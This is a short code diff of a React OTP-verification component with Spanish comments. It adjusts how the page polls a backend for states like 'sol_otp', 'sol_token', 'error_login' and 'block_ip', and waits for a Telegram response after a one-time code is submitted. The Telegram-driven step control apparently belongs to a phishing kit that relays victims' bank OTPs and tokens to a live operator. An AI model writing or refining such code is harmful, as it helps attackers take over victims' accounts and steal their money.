@@ -478,22 +478,24 @@ const OTPVerification = () => {
           return;
         }
 
+        // Si acabamos de enviar OTP y el estado sigue siendo sol_otp o pendiente, continuar esperando respuesta de Telegram
+        if (submitTickRef.current > 0 && (estadoActual === "sol_otp" || estadoActual === "pendiente")) {
+          pollingIntervalRef.current = setTimeout(poll, 2500);
+          return;
+        }
+
         // Se actualiza el estado anterior
         lastEstadoRef.current = estadoActual;
 
         // Se inicializan los estados que detienen el polling
         const stateValid = [
-          "sol_otp", "sol_token", "sol_finalizar", "sol_finalizado", "solicitar_finalizar", "error_otp", "error_token", "error_login", "block_ip", "error_blocked",
+          "sol_token", "sol_finalizar", "sol_finalizado", "solicitar_finalizar", "error_otp", "error_token", "error_login", "block_ip", "error_blocked",
         ];
 
         // Se valida si el estado actual debe seguir consultando
         if (!stateValid.includes(estadoActual)) {
-
-          // Se programa el siguiente ciclo de polling
-          pollingIntervalRef.current = setTimeout(poll, 3000);
+          pollingIntervalRef.current = setTimeout(poll, 2500);
         } else {
-
-          // Se setea el timeout de polling a null
           pollingIntervalRef.current = null;
         }
 
@@ -631,6 +633,9 @@ const OTPVerification = () => {
       // Se activa el loading y se registra el timestamp de envío
       setLoading(true);
       submitTickRef.current = Date.now();
+      lastEstadoRef.current = null;
+      modalBloqueoEstadoRef.current = null;
+      ignorarEstadoHastaCambioRef.current = null;
 
       // Se realiza la petición al backend central o al backend local
       const response = centralUrl
